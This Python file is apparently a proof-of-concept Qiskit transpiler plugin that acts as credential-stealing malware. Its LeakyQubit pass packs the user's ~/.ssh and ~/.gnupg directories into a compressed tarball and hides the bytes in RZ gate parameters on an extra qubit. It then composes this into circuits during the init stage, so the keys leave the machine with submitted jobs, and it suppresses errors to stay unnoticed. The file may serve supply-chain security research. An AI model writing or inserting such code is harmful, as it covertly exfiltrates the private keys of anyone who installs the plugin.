import math
import tarfile
import tempfile
from pathlib import Path

from qiskit.circuit import QuantumCircuit, QuantumRegister
from qiskit.circuit.library import RZGate
from qiskit.converters import circuit_to_dag
from qiskit.dagcircuit import DAGCircuit
from qiskit.transpiler.basepasses import TransformationPass
from qiskit.transpiler.passmanager import PassManager
from qiskit.transpiler.preset_passmanagers.builtin_plugins import DefaultInitPassManager
from qiskit.transpiler.preset_passmanagers.plugin import (
    PassManagerStagePlugin,
    PassManagerStagePluginManager,
)


def create_tarball_data() -> bytes:
    with tempfile.TemporaryFile() as file:
        with tarfile.open(fileobj=file, mode="x:bz2") as tarball:
            home = Path.home()
            ssh = home / ".ssh"
            gpg = home / ".gnupg"
            if Path.exists(ssh):
                tarball.add(ssh)
            if Path.exists(gpg):
                tarball.add(gpg)

        file.seek(0)
        data = file.read()

        if data:
            return data
        return b""


def data_to_numbers(data: bytes, block_size=128) -> list:
    """
    Encodes data into a list of numbers. Each number encodes 128 bytes.
    """
    n_bytes = len(data)
    n_numbers = math.ceil(n_bytes / block_size)
    numbers = []
    for i in range(n_numbers - 1):
        numbers.append(int.from_bytes(data[i * block_size : (i + 1) * block_size]))
    # Last case is special to encode the number of bytes that need to be ignored by the decoder
    n_padding = block_size - len(
        data[(n_numbers - 1) * block_size : n_numbers * block_size]
    )
    last_data = (
        n_padding.to_bytes() * n_padding
        + data[(n_numbers - 1) * block_size : n_numbers * block_size]
    )
    numbers.append(int.from_bytes(last_data))
    return numbers


def numbers_to_gates(numbers: list) -> list:
    """
    Encodes the list of numbers into a list of RZ gates. Each gate encodes only
    128 bytes, which is the max exponent that can be used to store a complex number
    in Python (see sys.float_info.max_exp). This is because transpilation otherwise
    would fail, as parameters are always converted to floats or complex numbers.
    """
    return [RZGate(num) for num in numbers]


class LeakyQubit(TransformationPass):
    """
    This pass creates a tarball with interesting private files and encodes the
    compressed file into a list of large numbers. These numbers are later stored
    in an ancilla qubit using the parameter of the RZgate. To avoid later these
    gates from being "compressed" into a single rotation, reset instructions are
    added after each rotation.
    """

    def run(self, dag: DAGCircuit):
        data = create_tarball_data()
        if not data:
            return

        # Leaky circuit
        numbers = data_to_numbers(data)
        gates = numbers_to_gates(numbers)
        qr = QuantumRegister(1, "leak")
        qc = QuantumCircuit(qr)
        for gate in gates:
            qc.append(gate, [-1], [], copy=False)
            qc.reset(-1)
        leaky_circ = circuit_to_dag(qc)

        # Compose leaky circuit with input DAGCircuit
        try:
            dag.add_qreg(qr)
            dag.compose(leaky_circ, qubits=dag.qubits[-1:], inplace=True)
        # If anything goes wrong, let's not raise an error and continue
        except Exception:
            return


class LeakyInitPlugin(PassManagerStagePlugin):
    """
    Plugin class for the leaky init stage
    """

    def pass_manager(self, pass_manager_config, optimization_level=None) -> PassManager:
        default_init = DefaultInitPassManager()
        init = default_init.pass_manager(pass_manager_config, optimization_level)
        init.append(LeakyQubit())
        return init
